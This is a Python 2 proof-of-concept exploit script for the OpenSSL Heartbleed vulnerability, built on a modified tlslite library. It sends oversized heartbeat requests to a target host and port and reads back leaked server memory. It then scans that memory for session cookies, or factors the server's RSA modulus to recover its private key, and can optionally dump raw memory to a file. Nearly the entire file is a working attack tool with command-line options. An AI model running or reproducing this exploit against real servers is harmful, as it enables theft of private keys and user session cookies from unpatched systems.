import socket
import sys
import getopt
import time
import re

from tlslite.api import *
from tlslite.messages import *
from tlslite import __version__

def usage():
    print "heartbleed.py   PoC for the openSSL heartbleed vulnerability"
    print "      -h  --  show this message"
    print "      -d  --  Set the destiation host and port:  HOST:PORT"
    print "      -n  --  Set the number of requests to make, more will grab more memory"
    print "      -p  --  Attempt to obtain the server's SSL private key"
    print "      -c  --  Attempt to find any cookie values in mem, paramter should be HTTP header ex: -c 'Cookie:'"
    print "      -s  --  set the servername extension."

try:
    opts, args = getopt.getopt(sys.argv[1:], "hd:n:c:s:pr")
except getopt.GetoptError as err:
    print str(err)
    usage()
    sys.exit(2)

numb = 1
address = "127.0.0.1:443"
find_priv_key = False
cookie_val = "Cookie:"
find_cookie = False
find_base = False
servername = None

for o, a in opts:
    if o == "-d":
        address = a.split(":")
        if len(address) != 2:
            raise SyntaxError("Must specify <host>:<port>")
        address = ( address[0], int(address[1]) )
    elif o == "-n":
        numb = int(a)
    elif o == "-h":
        usage()
        sys.exit()
    elif o == "-p":
        find_priv_key = True
    elif o == "-r":
        find_base = True 
    elif o == "-c":
        find_cookie = True
        cookie_val = a
    elif o == "-s":
        servername = a
    else:
        assert False, "unhandled option"


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect(address)
connection = TLSConnection(sock)

settings = HandshakeSettings()
settings.heart_beat = True

try:
    start = time.clock()
    connection.handshakeClientCert(None, None, settings=settings, serverName=servername)

    stop = time.clock()        
except TLSLocalAlert as a:
    if a.description == AlertDescription.user_canceled:
        print(str(a))
    else:
        raise
    sys.exit(-1)
except TLSRemoteAlert as a:
    if a.description == AlertDescription.unknown_psk_identity:
        if username:
            print("Unknown username")
        else:
            raise
    elif a.description == AlertDescription.bad_record_mac:
        if username:
            print("Bad username or password")
        else:
            raise
    elif a.description == AlertDescription.handshake_failure:
        print("Unable to negotiate mutually acceptable parameters")
    else:
        raise
    sys.exit(-1)

if find_priv_key:
    if connection.session.serverCertChain:
        pubkey = connection.session.serverCertChain.x509List[0].publicKey
        print("n = %s, e = %s" % (pubkey.n, pubkey.e))
        num_pubkey_bits = numBits(pubkey.n)
        print("pubkey_bits = %i" % num_pubkey_bits)
        prime_len_bytes = (num_pubkey_bits + 15) // 16

    else:
        print("We don't have a public key to factor, bailing.")
        sys.exit(-1)


# printGoodConnection(connection, stop-start)

heartbeat = HeartBeat()
heartbeat.create(type=1,
                pay_len=0xffff,
                payload="AA")


# up the range numbs to get more memory, sometimes it repeats.

resp = ""

for x in range(0, numb):
    for result in connection._sendMsg(heartbeat):
        pass

    resp = resp + connection.readPOC(0xffff)

if find_base:
    fd = open("/tmp/dump.txt", "w")
    fd.write(resp)
    fd.close()


if find_priv_key:
    resp = bytearray(resp)
    for i in range(0, len(resp)-prime_len_bytes):
        # reverse the bytes, only works for little-endian
        # targets (FIXME? Probably not worth it, would have
        # to guess word length on big-endian.)
        data = resp[i+prime_len_bytes:i:-1]
        data = bytesToNumber(data)
        #if data != 0: print(data)
        if data > 1 and pubkey != None and (pubkey.n % data) == 0:
            print("Success! p = %i, q = %i" % (data, pubkey.n//data))
            sys.exit(0)
elif find_cookie:
    # This is dirt and needs to be cleaned up.
    cookies = [m.start() for m in re.finditer(cookie_val, resp)]

    for start in cookies:
        stop = resp[start:].find("\n")
        print resp[start: stop]
else:
    print resp

connection.close()
